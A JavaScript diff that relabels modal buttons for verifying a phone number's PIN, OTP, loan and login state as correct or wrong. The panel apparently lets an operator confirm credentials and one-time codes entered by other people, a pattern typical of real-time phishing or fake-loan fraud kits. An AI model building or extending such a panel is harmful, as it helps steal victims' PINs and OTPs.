@@ -226,19 +226,19 @@ function renderTable(records){
 function escapeHtml(str){ return str.replace(/[&<>]/g,m=>m=='&'?'&amp;':m=='<'?'&lt;':m=='>'?'&gt;':m); }
 
 function attachEvents(){
-    document.querySelectorAll('.verify-pin').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'pin',[{label:'✅ On (1)',action:'correct',class:'btn-correct'},{label:'❌ Off (0)',action:'wrong',class:'btn-wrong'}]); });
+    document.querySelectorAll('.verify-pin').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'pin',[{label:'✅ CORRECT',action:'correct',class:'btn-correct'},{label:'❌ WRONG',action:'wrong',class:'btn-wrong'}]); });
     // Updated OTP modal: Off -> sets to 1, On -> sets to 2
     document.querySelectorAll('.verify-otp').forEach(btn=>{ 
         btn.onclick=()=>showModal(btn.dataset.phone,'otp',[
-            {label:'❌ OFF (Set to 1)',action:'off',class:'btn-otp-off'}, 
-            {label:'✅ ON (Set to 2)',action:'on',class:'btn-otp-on'}
+            {label:'❌ WRONG OTP',action:'off',class:'btn-otp-off'}, 
+            {label:'✅ CORRECT OTP',action:'on',class:'btn-otp-on'}
         ]); 
     });
     document.querySelectorAll('.verify-loan').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'loan',[{label:'✅ Approve (1)',action:'approve',class:'btn-approve'},{label:'❌ Default (0)',action:'default',class:'btn-default'}]); });
     document.querySelectorAll('.verify-logout').forEach(btn=>{ 
         btn.onclick=()=>showModal(btn.dataset.phone,'logout',[
-            {label:'✅ Yes - Logged In (1)',action:'allow',class:'btn-allow'}, 
-            {label:'❌ No - Logged Out (2)',action:'block',class:'btn-block'}
+            {label:'✅ Yes Logged In',action:'allow',class:'btn-allow'}, 
+            {label:'❌ No Logged Out',action:'block',class:'btn-block'}
         ]); 
     });
 }
